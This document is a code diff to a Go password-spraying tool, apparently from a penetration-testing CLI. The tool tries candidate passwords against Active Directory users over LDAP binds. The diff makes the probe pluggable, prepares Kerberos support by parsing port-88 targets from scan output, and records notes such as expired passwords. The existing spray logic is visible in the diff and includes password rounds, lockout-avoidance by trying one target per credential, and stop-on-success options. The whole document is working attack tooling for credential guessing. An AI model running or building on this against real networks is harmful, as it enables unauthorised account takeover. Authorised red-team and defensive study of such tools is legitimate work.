@@ -23,6 +23,17 @@ type Target struct {
 	TLS  bool
 }
 
+// Outcome is the result of probing one credential against one target.
+type Outcome struct {
+	Valid      bool   // credentials accepted
+	Definitive bool   // true = the service answered (valid or invalid); false = network/parse error, try next target
+	Note       string // extra context, e.g. "password expired", "user does not exist", "KDC refused RC4"
+}
+
+// ProbeFunc checks one credential against a target. Implementations exist per
+// protocol (LDAPProbe, KerberosProbe).
+type ProbeFunc func(t Target, user, password, domain string, timeout int) Outcome
+
 // Options controls a spray run.
 type Options struct {
 	Targets           []Target
@@ -36,6 +47,7 @@ type Options struct {
 	RoundDelay        time.Duration                           // pause between password rounds
 	ContinueOnSuccess bool                                    // keep spraying users whose password was already found
 	StopOnSuccess     bool                                    // stop the whole spray after the first valid credential
+	Probe             ProbeFunc                               // per-credential check; defaults to LDAPProbe when nil
 	OnHit             func(Hit)                               // optional live callback for each valid credential
 	OnRoundStart      func(round, total int, password string) // optional per-round progress
 }
@@ -45,6 +57,7 @@ type Hit struct {
 	Host     string
 	User     string
 	Password string
+	Note     string // e.g. "password valid but EXPIRED"
 }
 
 // Result summarizes a spray run.
@@ -52,6 +65,7 @@ type Result struct {
 	Attempts int
 	Errors   int
 	Valid    []Hit
+	Notes    []string // deduped non-fatal notes worth surfacing (e.g. "KDC refused RC4")
 	Duration time.Duration
 }
 
@@ -63,9 +77,15 @@ func Run(opts Options) *Result {
 		opts.Concurrency = 10
 	}
 
+	probe := opts.Probe
+	if probe == nil {
+		probe = LDAPProbe
+	}
+
 	res := &Result{}
 	found := make(map[string]bool) // users already cracked, skipped in later rounds
-	stop := false                  // set once a hit is found and StopOnSuccess is on
+	noteSeen := make(map[string]bool)
+	stop := false // set once a hit is found and StopOnSuccess is on
 	var mu sync.Mutex
 
 	for i, password := range opts.Passwords {
@@ -117,17 +137,21 @@ func Run(opts Options) *Result {
 				// One credential is tried against a single responsive target
 				// (DCs share the directory) to avoid multiplying lockout counters.
 				for _, t := range opts.Targets {
-					valid, err := attempt(t, user, password, opts.Domain, opts.Timeout)
+					out := probe(t, user, password, opts.Domain, opts.Timeout)
 
 					mu.Lock()
 					res.Attempts++
-					if err != nil {
+					if !out.Definitive {
 						res.Errors++
+						if out.Note != "" && !noteSeen[out.Note] {
+							noteSeen[out.Note] = true
+							res.Notes = append(res.Notes, out.Note)
+						}
 						mu.Unlock()
 						continue // non-definitive (network/parse); try next target
 					}
-					if valid {
-						hit := Hit{Host: t.Host, User: user, Password: password}
+					if out.Valid {
+						hit := Hit{Host: t.Host, User: user, Password: password, Note: out.Note}
 						res.Valid = append(res.Valid, hit)
 						found[user] = true
 						if opts.OnHit != nil {
@@ -156,10 +180,10 @@ func Run(opts Options) *Result {
 	return res
 }
 
-// attempt returns (valid, err). err==nil with valid==false is a definitive
-// "invalid credentials"; a non-nil err is a non-definitive failure (connection,
-// unparsable response) that the caller may retry against another target.
-func attempt(t Target, user, password, domain string, timeout int) (bool, error) {
+// LDAPProbe checks one credential via an LDAP simple bind. An "invalid
+// credentials" bind is a definitive negative; any other error is non-definitive
+// (connection/parse) and the caller may retry against another target.
+func LDAPProbe(t Target, user, password, domain string, timeout int) Outcome {
 	conn, err := ldap.Connect(ldap.LDAPOptions{
 		Host:    t.Host,
 		Port:    t.Port,
@@ -167,17 +191,17 @@ func attempt(t Target, user, password, domain string, timeout int) (bool, error)
 		Timeout: timeout,
 	})
 	if err != nil {
-		return false, err
+		return Outcome{Definitive: false}
 	}
 	defer conn.Close()
 
 	if err := conn.Bind(user, password, domain); err != nil {
 		if strings.Contains(strings.ToLower(err.Error()), "invalid credentials") {
-			return false, nil
+			return Outcome{Definitive: true, Valid: false}
 		}
-		return false, err
+		return Outcome{Definitive: false}
 	}
-	return true, nil
+	return Outcome{Definitive: true, Valid: true}
 }
 
 func jitterSleep(d time.Duration) {
@@ -238,6 +262,34 @@ func ParseScanTargets(data []byte) ([]Target, error) {
 
 	if len(targets) == 0 {
 		return nil, fmt.Errorf("no ad-tagged LDAP targets (ports 389/636/3268/3269) in scan output")
+	}
+	return targets, nil
+}
+
+// ParseScanKerberosTargets extracts the AD-tagged Kerberos endpoints (port 88)
+// from the JSON output of `raxuiscli scan`.
+func ParseScanKerberosTargets(data []byte) ([]Target, error) {
+	var sf scanFile
+	if err := json.Unmarshal(data, &sf); err != nil {
+		return nil, fmt.Errorf("invalid scan JSON: %w", err)
+	}
+
+	var targets []Target
+	seen := make(map[string]bool)
+	for _, h := range sf.Hosts {
+		for _, p := range h.OpenPorts {
+			if p.Tag != "ad" || p.Port != 88 {
+				continue
+			}
+			if !seen[h.IP] {
+				seen[h.IP] = true
+				targets = append(targets, Target{Host: h.IP, Port: 88})
+			}
+		}
+	}
+
+	if len(targets) == 0 {
+		return nil, fmt.Errorf("no ad-tagged Kerberos targets (port 88) in scan output")
 	}
 	return targets, nil
 }
